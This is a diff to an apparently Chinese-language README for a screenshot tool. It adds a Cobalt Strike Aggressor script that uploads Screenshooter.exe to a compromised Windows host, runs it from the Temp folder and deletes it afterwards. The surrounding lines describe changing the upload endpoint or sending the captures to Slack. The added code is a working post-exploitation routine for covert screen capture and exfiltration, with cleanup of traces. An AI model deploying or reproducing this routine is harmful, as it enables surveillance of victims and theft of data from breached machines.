@@ -28,3 +28,25 @@ sls plugin install -n serverless-python-requirements
 替换上传[接口](https://github.com/JKme/Screenshooter/blob/master/Screenshooter/Program.cs#L203)之后编译即可使用。
 
 PS: 直接修改源代码上传到slack也是可以的
+
+### CNA
+```
+ item "screenshots" {
+            $bid = $1;
+            $dialog = dialog("Upload Screenshots", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &screenshots);
+            drow_text($dialog, "UploadPath",  "path: ");
+            dbutton_action($dialog, "ok");
+            dialog_show($dialog);
+        }
+
+        sub screenshots {
+            # switch to specify path
+            bcd($bid, $3['UploadPath']);
+            bsleep($bid, 0 ,0);
+            $bin = $3['UploadPath'];
+            bupload($bid, script_resource("/script/Screenshooter.exe"));
+            bshell($bid, "$bin $+ Screenshooter.exe")
+            bshell($bid, "del $bin $+ Screenshooter.exe")
+            # show_message("Executing cmmand!");
+        }
+```
